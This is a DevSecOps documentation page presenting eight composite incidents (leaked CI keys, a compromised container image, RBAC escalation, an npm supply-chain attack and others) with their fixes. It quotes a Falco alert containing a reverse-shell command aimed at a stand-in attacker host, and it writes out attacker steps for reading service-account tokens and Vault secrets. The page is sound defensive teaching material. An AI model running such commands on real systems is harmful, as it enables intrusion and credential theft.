---
title: "Real-World Examples"
sidebar_position: 7
---

# Security & DevSecOps — Real-World Examples

Eight security incidents with root cause analysis, timeline, impact, and prevention. These are composite examples based on real incident patterns.

---

## Incident 1: API Key Leaked in GitHub CI Logs

**Context:** A team added verbose logging to debug a failing CI job. The debug output included the value of the `AWS_SECRET_ACCESS_KEY` environment variable. The CI job ran on a public repository, making the logs publicly accessible.

**Timeline:**
- T+0: Developer enables `set -x` in CI script to debug a failing AWS CLI call
- T+2h: CI logs with key value visible at a public URL (GitHub Actions on a public repo)
- T+3h: Automated scanner (likely a bot monitoring GitHub for AWS credentials) finds the key
- T+4h: Unauthorized EC2 instances launched in `us-east-1` and `ap-southeast-1` for cryptocurrency mining
- T+6h: AWS billing alert fires for unusual spend; incident declared

**Root cause:**
1. Debug logging exposed secret values
2. AWS credentials were long-lived IAM user keys stored as GitHub secrets — not rotated
3. No anomaly detection on the AWS account for unusual EC2 launches
4. No SCPs (Service Control Policies) to prevent large instance types

**Response:**
```bash
# Immediate: revoke the compromised key
aws iam delete-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --user-name ci-user

# Terminate unauthorized instances
aws ec2 describe-instances \
  --filters "Name=instance-state-name,Values=running" \
  --query "Reservations[].Instances[].InstanceId" | \
  xargs aws ec2 terminate-instances --instance-ids

# Review CloudTrail for all actions taken with the compromised key
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=ci-user \
  --start-time 2024-01-15T00:00:00Z
```

**Prevention:**
- Replace IAM user keys with OIDC federation (no long-lived keys to leak)
- Prohibit `set -x` in CI scripts that handle secrets
- Enable GitHub Advanced Security secret scanning (alerts within seconds of a push)
- Add AWS SCP to limit maximum instance sizes for non-approved instance types
- Set up AWS CloudTrail alerts for `RunInstances` from unusual regions

---

## Incident 2: Compromised Container Image in Production

**Context:** A base image (`node:14`) in an internal application was pulled without a digest pin. An upstream registry compromise replaced the image with one containing a reverse shell payload. The production deployment pulled the new (malicious) image during a rolling update.

**Timeline:**
- T-7d: Base image updated with malicious layer by upstream compromiser
- T+0: Scheduled Kubernetes deployment restarts pod with `imagePullPolicy: Always` and `node:14` tag
- T+2h: Falco generates alerts for unexpected outbound connections and shell spawning
- T+4h: Security team investigates; confirms reverse shell in running pod
- T+5h: Affected deployment rolled back; all pods in namespace recycled

**Root cause:**
1. Image pinned by mutable tag (`node:14`) not immutable digest (`node:14@sha256:...`)
2. No image signing or signature verification at admission
3. No Trivy scan of the new image before deployment
4. `imagePullPolicy: Always` caused pull on every pod restart

**What the attack looked like in Falco:**
```
CRITICAL: Shell spawned by non-shell parent (user=root container=node-app image=node:14
 shell=bash parent=node cmdline=bash -i >& /dev/tcp/attacker.com/4444 0>&1)
WARNING: Unexpected outbound connection (destination=203.0.113.42:4444 container=node-app)
```

**Prevention:**
```bash
# Pin base images by digest
FROM node:14@sha256:a9f0e6a3c4f4b5d8e7f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3

# Verify image digest before deployment (Cosign)
cosign verify --key cosign.pub node:14

# Admission controller: require signed images (Kyverno)
# All pods must use digests, not tags
```

Deployment fix:
```yaml
containers:
  - name: app
    image: node@sha256:a9f0e6a3c4f4b5d8e7f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3
    imagePullPolicy: IfNotPresent  # never pull if digest already present
```

---

## Incident 3: Privilege Escalation via Misconfigured RBAC

**Context:** A monitoring service account (`prometheus-sa`) was granted a ClusterRole that included `get` and `list` on `secrets`. A developer on the team discovered this and used `kubectl exec` into the Prometheus pod to read production database credentials stored as Kubernetes Secrets.

**Timeline:**
- T-30d: Prometheus ClusterRole created with `secrets: get, list` (copied from an example that was not scoped down)
- T+0: Developer runs `kubectl exec -n monitoring prometheus-pod -- env` — sees no secrets there
- T+2h: Developer reads Prometheus docs; uses token from pod to call K8s API
- T+4h: `kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get secrets -A`
- T+5h: Production database credentials extracted from cluster secrets

**Root cause:**
1. RBAC was not reviewed for least privilege before deployment
2. Production database credentials stored as plain Kubernetes Secrets (not in Vault)
3. No audit log alerting for unusual API access patterns (service accounts reading secrets at scale)
4. No network policy preventing exec into monitoring pods

**Detection (what should have caught this):**
```bash
# Kubernetes audit log entry that would have alerted
{
  "verb": "get",
  "resource": "secrets",
  "namespace": "production",
  "user": {
    "username": "system:serviceaccount:monitoring:prometheus-sa"
  }
}
# Alert: service account accessing secrets outside its namespace
```

**Prevention:**
```yaml
# Scoped ClusterRole — no access to secrets
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: prometheus-reader
rules:
  - apiGroups: [""]
    resources: ["nodes", "pods", "services", "endpoints"]
    verbs: ["get", "list", "watch"]
  - apiGroups: ["metrics.k8s.io"]
    resources: ["*"]
    verbs: ["get", "list"]
  # Explicitly: NO access to secrets
```

Audit log alert: alert on any service account that reads secrets from a namespace it does not own.

---

## Incident 4: Lateral Movement via Over-Permissive Service Account

**Context:** An attacker gained code execution in a web application pod (via a deserialization vulnerability). The pod's service account had `cluster-admin` access — granted during a debugging session six months prior and never removed.

**Timeline:**
- T+0: Attacker exploits Java deserialization vulnerability in a public API pod
- T+5m: Attacker discovers Kubernetes service account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`
- T+10m: Attacker calls K8s API with the token: `kubectl get secrets -A`
- T+15m: Attacker creates a new pod with `hostPID: true` and `privileged: true`
- T+20m: Attacker escapes from the privileged pod to the host node
- T+35m: Attacker accesses node IAM credentials from EC2 IMDS
- T+45m: Full AWS account access obtained via node instance role

**Root cause:**
1. Service account had `cluster-admin` binding — never cleaned up
2. No Pod Security Standards preventing privileged pod creation
3. Node instance role had overly permissive IAM policies
4. No Falco rules alerting on new privileged pod creation
5. No network policy preventing pod-to-IMDS communication

**Full attack chain:**
```
App vulnerability -> K8s API access -> cluster-admin token ->
privileged pod creation -> host escape -> EC2 IMDS -> AWS account
```

**Prevention:**
```bash
# Automated cleanup: remove cluster-admin bindings
kubectl get clusterrolebinding -o json | \
  jq '.items[] | select(.roleRef.name=="cluster-admin") | .metadata.name' | \
  xargs -I{} kubectl delete clusterrolebinding {}

# Block IMDS access from pods with NetworkPolicy
cat <<'EOF' | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-imds
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 169.254.169.254/32  # block AWS IMDS
EOF

# Falco: alert on privileged pod creation
- rule: Privileged pod created
  condition: >
    ka.verb = create and ka.target.resource = pods
    and ka.req.pod.containers.privileged = true
  output: "Privileged pod created (user=%ka.user.name pod=%ka.target.name)"
  priority: CRITICAL
```

---

## Incident 5: Supply Chain Attack via Compromised npm Package

**Context:** A widely-used npm package (`event-stream`) was handed over to a malicious maintainer who added code that exfiltrated `npm` credentials when specific conditions were met. Several internal services depended on it transitively.

**Timeline:**
- T-0: Malicious code merged to `event-stream` v3.3.6
- T+0: Internal CI runs `npm install` — lockfile was not checked into git
- T+2h: Build completes; malicious code is now in the deployed container
- T+6h: Security researcher publishes disclosure
- T+8h: Security team identifies affected services via SBOM lookup
- T+12h: All affected services redeployed with patched lockfile; credentials rotated

**Root cause:**
1. `package-lock.json` not committed — `npm install` resolved to latest, pulling the malicious version
2. No SBOM meant manual audit was required to find affected services
3. No Trivy scan for the new vulnerability (CVE published later)
4. npm `postinstall` scripts ran without restriction

**SBOM-enabled response vs. manual:**
```bash
# With SBOM: 5 minutes to find affected services
grype sbom:./sbom.spdx.json | grep event-stream

# Without SBOM: hours of manual audit across dozens of services
grep -r "event-stream" */package.json */package-lock.json
```

**Prevention:**
```bash
# Always commit lockfiles
git add package-lock.json yarn.lock

# Pin exact versions in package.json
# Use "event-stream": "3.3.5" not "^3.3.5"

# Disable postinstall scripts in CI
npm install --ignore-scripts

# Enable npm audit in CI
npm audit --audit-level=high

# Use an internal registry proxy (Nexus/Artifactory) to block flagged packages
# The proxy can block downloads of known-malicious package versions
```

---

## Incident 6: TLS Certificate Expiry Causes Production Outage

**Context:** A wildcard TLS certificate for `*.internal.company.com` expired. The certificate was manually managed — issued two years ago and stored in a Kubernetes Secret. No renewal process was in place.

**Timeline:**
- T-30d: cert-manager would have alerted if it were managing this certificate — it was not
- T+0: Certificate expires at 03:47 UTC
- T+4h: On-call engineer receives user-reported 503 errors
- T+5h: `curl -vk https://api.internal.company.com` reveals SSL handshake failure
- T+6h: Emergency certificate issued; secrets updated; ingress restarted

**Root cause:**
1. Manual certificate management with no expiry tracking
2. No monitoring/alerting on certificate expiry
3. Certificate stored in a Secret without rotation automation

**Detection commands:**
```bash
# Check all TLS secrets for expiry
kubectl get secrets -A -o json | \
  jq '.items[] | select(.type=="kubernetes.io/tls") | {
    name: .metadata.name,
    namespace: .metadata.namespace,
    cert: .data["tls.crt"]
  }' | \
  while read -r secret; do
    echo "$secret" | jq -r .cert | base64 -d | openssl x509 -noout -enddate
  done

# Prometheus alert rule
- alert: CertificateExpiringIn30Days
  expr: |
    (probe_ssl_earliest_cert_expiry - time()) / 86400 < 30
  for: 1h
  annotations:
    summary: "Certificate expires in {{ $value | humanizeDuration }}"
```

**Prevention: migrate to cert-manager**
```yaml
# cert-manager automatically renews certificates 30 days before expiry
apiVersion: cert-manager.io/v1
kind: Certificate
metadata:
  name: wildcard-internal
  namespace: production
spec:
  secretName: wildcard-internal-tls
  issuerRef:
    name: letsencrypt-prod
    kind: ClusterIssuer
  dnsNames:
    - "*.internal.company.com"
  renewBefore: 720h  # renew 30 days before expiry
```

---

## Incident 7: Secret Sprawl via Vault Token Shared Across Services

**Context:** An operations team created a single Vault token with broad `read` access to all production secrets and shared it across five microservices via a Kubernetes Secret. When one service was compromised, the attacker used the shared token to read all production secrets.

**Timeline:**
- T+0: Service A compromised via an unpatched dependency (Log4Shell)
- T+5m: Attacker reads `/var/run/secrets/vault-token` from the compromised pod
- T+10m: Attacker uses token: `vault list secret/production/`
- T+15m: All production secrets readable: database passwords, API keys, SMTP credentials

**Root cause:**
1. One shared token for multiple services — violates least privilege
2. Token had excessive scope (`path "secret/*" { capabilities = ["read"] }`)
3. No per-service Vault policies
4. No Vault audit log alerting for anomalous access patterns

**Blast radius with shared token:** ALL production secrets exposed.  
**Blast radius with per-service tokens:** only Service A's secrets exposed.

**Prevention:**
```hcl
# Per-service Vault policy — Service A can only read its own secrets
path "secret/data/production/service-a/*" {
  capabilities = ["read"]
}

# Service B cannot read Service A secrets
# (separate Vault role bound to Service B's K8s service account)
```

```bash
# Vault Kubernetes auth — each service account gets its own role
vault write auth/kubernetes/role/service-a \
  bound_service_account_names=service-a-sa \
  bound_service_account_namespaces=production \
  policies=service-a-policy \
  ttl=1h

vault write auth/kubernetes/role/service-b \
  bound_service_account_names=service-b-sa \
  bound_service_account_namespaces=production \
  policies=service-b-policy \
  ttl=1h
```

---

## Incident 8: Admission Webhook Misconfiguration Blocks All Deployments

**Context:** A Gatekeeper update caused the admission webhook to enter a broken state. Because `failurePolicy: Fail` was set, every deployment to the cluster was blocked. The incident lasted 45 minutes until the webhook was removed.

**Timeline:**
- T+0: Gatekeeper upgraded via Helm; new pods crash during startup due to a misconfigured `opa-envoy` sidecar
- T+2m: All deployments across the cluster fail with: `admission webhook "gatekeeper-validating-webhook-configuration" returned error`
- T+5m: CI/CD pipelines fail across all teams; PagerDuty fires
- T+15m: On-call identifies admission webhook as root cause
- T+20m: Gatekeeper pods restarted; issue persists (pods still not ready)
- T+45m: Webhook configuration temporarily removed; deployments unblock; Gatekeeper reinstalled

**Root cause:**
1. Gatekeeper upgrade was not tested in staging before production
2. `failurePolicy: Fail` on the webhook — appropriate for security, but caused full blast radius
3. No pre-upgrade health check of the Gatekeeper pods
4. Runbook for "admission webhook down" not documented

**Emergency remediation:**
```bash
# Step 1: identify the blocking webhook
kubectl get validatingwebhookconfigurations
kubectl describe validatingwebhookconfiguration gatekeeper-validating-webhook-configuration

# Step 2: temporarily remove the webhook (USE SPARINGLY — removes security controls)
kubectl delete validatingwebhookconfiguration gatekeeper-validating-webhook-configuration

# Step 3: fix the underlying issue (in this case, restart Gatekeeper)
kubectl rollout restart deployment/gatekeeper-controller-manager -n gatekeeper-system
kubectl wait --for=condition=ready pod -l app=gatekeeper -n gatekeeper-system --timeout=60s

# Step 4: reinstall the webhook (it is re-created when Gatekeeper is healthy)
helm upgrade gatekeeper gatekeeper/gatekeeper -n gatekeeper-system

# Step 5: verify webhook is functional
kubectl apply --dry-run=server -f test-deployment.yaml
```

**Prevention:**
```yaml
# Webhook with namespace exclusion — protect system namespaces
webhooks:
  - name: validation.gatekeeper.sh
    failurePolicy: Fail
    namespaceSelector:
      matchExpressions:
        - key: admission.gatekeeper.sh/ignore
          operator: DoesNotExist
    timeoutSeconds: 10  # fast fail; don't hang API server

# Label kube-system and gatekeeper-system to exclude from the webhook
kubectl label namespace kube-system admission.gatekeeper.sh/ignore=true
kubectl label namespace gatekeeper-system admission.gatekeeper.sh/ignore=true
```

**Staged rollout for admission webhook changes:**
1. Apply to a non-production cluster first
2. Apply with `failurePolicy: Ignore` in production for 1 hour (observe, no blocking)
3. Switch to `failurePolicy: Fail` after confirming the webhook is healthy
4. Monitor admission webhook latency (add to Prometheus alerts)

---

## Patterns Across All Incidents

| Pattern | Incidents | Prevention |
|---|---|---|
| Overly broad permissions | 3, 4, 7 | RBAC audit; per-service scoping; least privilege reviews |
| No secret rotation/expiry | 1, 6, 7 | Dynamic secrets; cert-manager; OIDC federation |
| No immutable artifact strategy | 2 | Digest pinning; image signing; Cosign verification |
| No SBOM | 5 | SBOM generation in every build; Grype for ongoing scanning |
| Untested failure modes | 8 | Chaos engineering for security controls; staged rollouts |
| No runtime detection | 2, 3, 4 | Falco; eBPF; audit log alerting |
| Manual processes | 6, 7 | Automate rotation; cert-manager; External Secrets Operator |
